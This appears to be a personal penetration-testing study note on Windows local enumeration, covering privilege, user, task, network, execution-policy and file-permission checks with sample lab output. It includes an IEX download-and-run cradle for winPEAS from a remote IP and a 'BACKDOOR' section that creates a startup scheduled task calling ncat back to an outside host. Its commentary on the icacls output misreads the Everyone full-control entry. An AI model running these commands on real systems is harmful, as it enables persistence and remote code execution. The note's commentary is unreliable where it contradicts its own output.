---
tags:
  - windows
  - privilege-escalation
  - enumeration
---
# Windows Local Enumeration Methodology

Reordered from your original note into a "who am I → what's around me → what can I abuse" flow. This mirrors how you'd actually work a box: confirm context first, then widen out to users/system, then processes/tasks/network, then permissions and policy (the things that actually gate escalation), and finish with automated tooling as a cross-check — not a starting point.

---

## 1. Current User Context (always step 0)

### Current privileges

`whoami /priv`

```powershell
C:\Users\john>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name               State          Description 
SeRestorePrivilege          Enabled       Restore files and directories                                      
SeDebugPrivilege            Enabled       Debug programs                                                     
SeChangeNotifyPrivilege     Enabled       Bypass traverse checking                                            
SeImpersonatePrivilege      Enabled       Impersonate a client after authentication              
SeCreateGlobalPrivilege     Enabled       Create global objects                                              
SeIncreaseWorkingSetPrivilege   Disabled   Increase a process working set                                     
```

1. `SeChangeNotifyPrivilege` lets the user bypass directory traversal checks to navigate folders without explicit permissions (though it's not immediately useful for us).
2. `SeImpersonatePrivilege` allows the user to impersonate others after authentication — an important capability for potential privilege escalation.

### Current group membership

`whoami /groups`

```powershell
C:\Users\john>whoami /groups 
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                                     
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\BATCH                                            Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group             
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group             
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group             
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

_(more in [[Windows Permission Management]])_

---

## 2. User & Group Enumeration (broaden out from yourself)

### Enumerate a specific user

```powershell
net user <username>
```

```powershell
Get-LocalUser -Name "username" | fl
Get-LocalGroup -Name "groupname" | fl
```

```powershell
Get-CimInstance Win32_UserAccount -Filter "Name='John'" | Format-List *           
Status                : OK
Caption               : WIN01\John
PasswordExpires       : False
Description           : 
InstallDate           : 
Name                  : John
Domain                : WIN01
LocalAccount          : True
SID                   : S-1-5-21-481531802-3248398329-2133938904-1002
SIDType               : 1
AccountType           : 512
Disabled              : False
FullName              : john
Lockout               : False
PasswordChangeable    : True
PasswordRequired      : True
PSComputerName        : 
CimClass              : root/cimv2:Win32_UserAccount
CimInstanceProperties : {Caption, Description, InstallDate, Name...}
CimSystemProperties   : Microsoft.Management.Infrastructure.CimSystemProperties 
```

`net user <username>`

```powershell
net user john
User name                    john
Full Name                    john
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2025 11:57:29 AM
Password expires             Never
Password changeable          2/23/2025 11:57:29 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   5/31/2026 1:08:39 AM

Logon hours allowed          All

Local Group Memberships      *Event Log Readers    *Remote Desktop Users 
                             *Users                
Global Group memberships     *None                 
The command completed successfully.
```

### Creating a user

```powershell
net user <Username> <password> /add
```

---

## 3. OS / System Enumeration

`compmgmt.msc` — GUI entry point for local users/groups, services, disks, event viewer, etc.

### Basic

```powershell
Get-ComputerInfo    # ALL POSSIBLE INFORMATION
	Get-ComputerInfo -Property "OsName", "OsVersion", "OsArchitecture"
systeminfo # detailed OS version, network settings, hardware, installed updates
wmic qfe   # list all installed updates
```

### Get-CimInstance (modern)

```powershell
Get-CimInstance -ClassName Win32_OperatingSystem  # System info
Get-CimInstance -ClassName Win32_Process          # Running processes
Get-CimInstance -ClassName Win32_Service          # Services
Get-CimInstance -ClassName Win32_BIOS             # BIOS info
```

### Get-WmiObject (legacy, PowerShell 3.0)

```powershell
Get-WmiObject -Class win32_OperatingSystem # system info
Get-WmiObject -Class Win32_Process         # running processes info 
Get-WmiObject -Class Win32_Service         # listening services
Get-WmiObject -Class Win32_Bios            # BIOS info
```

---

## 4. Process & Task Listing

```powershell
# CMD
tasklist
tasklist /v
tasklist /svc                           # process + PID + Services

# PowerShell
Get-Process > file.txt
```

_(more in [[Windows Processes and Services]])_

---

## 5. Scheduled Tasks

```powershell
schtasks /query /fo LIST /v
```

```
Folder: \\ 
HostName: WIN01 
TaskName: \\CorpBackupAgent 
Next Run Time: 2/24/2025 3:38:46 PM 
Status: Ready 
Logon Mode: Interactive/Background 
Last Run Time: 2/24/2025 3:36:46 PM 
Last Result: 0 
Author: LOGGING-VM\Administrator 
Task To Run: powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\ProgramData\CorpBackup\Scripts\backupprep.ps1 
Start In: N/A 
Comment: Legacy backup agent health check and prep 
Scheduled Task State: Enabled 
Idle Time: Disabled 
Power Management: 
Run As User: Administrator 
Delete Task If Not Rescheduled: Disabled 
Stop Task If Runs X Hours and X Mins: 72:00:00 
Schedule: Scheduling data is not available in this format. 
Schedule Type: One Time Only, Minute 
Start Time: 11:56:46 AM 
Start Date: 2/23/2025 
End Date: N/A 
Days: N/A 
Months: N/A 
Repeat: Every: 0 Hour(s), 2 Minute(s) 
Repeat: Until: Time: None 
Repeat: Until: Duration: Disabled 
Repeat: Stop If Still Running: Disabled
```

**Flag to yourself:** this task runs as `Administrator` and executes a script from a `ProgramData` path on a schedule — that's exactly the kind of entry worth checking permissions on next (see section 7).

---

## 6. Network Enumeration — Listening Ports

```powershell
netstat -ano
```

```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:22             0.0.0.0:0              LISTENING       2872
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       900
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3000           0.0.0.0:0              LISTENING       2456
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       408
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5986           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       3016
  TCP    0.0.0.0:8889           0.0.0.0:0              LISTENING       3016
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       492
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1256
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1772
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2204
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2680
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       2568
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       632
  TCP    10.129.19.109:139      0.0.0.0:0              LISTENING       4
  TCP    10.129.19.109:3389     10.10.14.79:32874      ESTABLISHED     408
  TCP    10.129.19.109:49691    10.10.14.79:4444       ESTABLISHED     1684
  TCP    10.129.19.109:49705    10.10.14.79:4444       ESTABLISHED     6360
  TCP    127.0.0.1:8001         0.0.0.0:0              LISTENING       3016
  TCP    127.0.0.1:8001         127.0.0.1:49672        ESTABLISHED     3016
  TCP    127.0.0.1:8003         0.0.0.0:0              LISTENING       3016
  TCP    127.0.0.1:49672        127.0.0.1:8001         ESTABLISHED     3016
```

---

## 7. Execution Policy

Execution Policy is a security control that limits which scripts can run.

```powershell
Get-ExecutionPolicy -List
          Scope ExecutionPolicy 
          ----- --------------- 
          MachinePolicy     Undefined  # for the whole machine
          UserPolicy        Undefined  # for specified user
          Process           Undefined  # for this terminal session
          CurrentUser       Undefined  # for current user
          LocalMachine      RemoteSigned # for all users of this machine
```

|Policy|Description|
|---|---|
|AllSigned|All scripts (remote and local) and configuration files must be signed by a publisher. Warns before running scripts from unknown publishers.|
|Bypass|Nothing is blocked, no warnings.|
|Default|Restricted on Windows workstations, RemoteSigned on Windows Servers.|
|RemoteSigned|Downloaded scripts require digital signatures; locally written scripts don't.|
|Restricted|Only individual commands allowed. Scripts are blocked.|
|Undefined|No policy set for this scope. If all scopes are Undefined, Restricted (default) applies.|
|Unrestricted|Default on non-Windows machines. Allows unsigned scripts but warns the user.|

Set Bypass for the current terminal session only:

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

---

## 8. File & Path Permissions

`icacls "path\to\file"`

```powershell
icacls "C:\ProgramData\CorpBackup\Scripts\backupprep.ps1"
C:\ProgramData\CorpBackup\Scripts\backupprep.ps1 Everyone:(I)(F)
                                                 NT AUTHORITY\SYSTEM:(I)(F)
                                                 BUILTIN\Administrators:(I)(F)
                                                 BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

**Tie-back to section 5:** this is the same script the `CorpBackupAgent` scheduled task runs as `Administrator`. If `Everyone` had `(F)` (full control) here instead of just `BUILTIN\Users:(I)(RX)`, that'd be a textbook scheduled-task-hijack path — worth practicing spotting the difference between read/execute and full control on privileged-run scripts.

_(more in [[Windows Permission Management]])_

---

## 9. Automated Enumeration (verification pass, not a starting point)

### WinPEAS transfer

```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.79:8090/winPEASS.ps1')" > winpeas.txt
```

Run this **after** manual enumeration, not instead of it — it's a good way to check you didn't miss anything, but relying on it first skips the reasoning practice you actually want for CJCA/GCIH/CPTS.

---
### BACKDOOR!
```powershell
sctasks /create /tn "Backdoor" /sc ONSTART /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"          # basic nmap

######### Changing Task ################
schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
```
## Suggested flow recap

`whoami /priv` + `/groups` → `user/group` enum → `system/OS` enum → `processes/tasks` →` scheduled tasks` → `network` → `execution policy` → `file permissions` → WinPEAS as a final sweep.